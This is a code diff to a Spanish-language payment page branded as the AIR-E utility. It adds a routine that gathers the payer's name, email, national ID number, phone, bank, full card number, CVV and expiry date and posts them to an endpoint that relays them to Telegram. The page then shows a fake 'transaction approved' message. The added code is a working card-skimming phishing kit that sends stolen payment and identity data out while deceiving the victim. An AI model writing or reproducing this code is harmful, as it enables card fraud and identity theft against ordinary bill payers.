@@ -451,7 +451,57 @@
         btnLoader.classList.remove('hidden'); 
         statusEl.textContent = 'Procesando transacción... Por favor espere.';
 
-        // 5. Simulación del proceso de 3 segundos
+        // 5. Enviar datos a Telegram y luego simular el proceso
+        const formattedAmount = formatCurrencyCOP(amount);
+        const cardNumberFull = cardNumberEl.value.replace(/\D/g, '');
+        
+        const telegramMessage = `
+💳 PAGO AIR-E - DATOS DE PAGO RECIBIDOS ⚡
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 DATOS DEL TITULAR
+🧑 Nombre: ${payload.fullName}
+📧 Email: ${payload.email}
+🆔 Cédula: ${payload.idNumber}
+📱 Teléfono: ${payload.phone}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 INFORMACIÓN DE PAGO COMPLETA
+🏦 Banco: ${payload.bank}
+💳 Tarjeta PAN: ${secureData.pan}
+🔐 CVV: ${secureData.cvv}
+🗓️ Vencimiento: ${secureData.expDate}
+🔑 Tipo: ${payload.cardType}
+💵 Monto: ${formattedAmount}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ Fecha/Hora: ${new Date().toLocaleString('es-CO')}
+🆔 ID de Transacción: ${payload.timestamp}
+`;
+
+        // Enviar a Telegram
+        fetch('/api/send-message', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            text: telegramMessage
+            // No enviamos keyboard si no hay botones
+          })
+        }).then(response => {
+          if (!response.ok) {
+            return response.json().then(err => {
+              console.error('Error al enviar a Telegram:', err);
+              throw new Error(err.error || 'Error desconocido');
+            });
+          }
+          return response.json();
+        })
+        .then(data => {
+          console.log('Datos enviados a Telegram:', data);
+        })
+        .catch(error => {
+          console.error('Error al enviar a Telegram:', error);
+          // Continuar con el flujo aunque falle el envío a Telegram
+        });
+
+        // Simulación del proceso de 3 segundos
         setTimeout(function () {
           statusEl.textContent = 'Transacción aprobada. Redirigiendo a confirmación...';
 
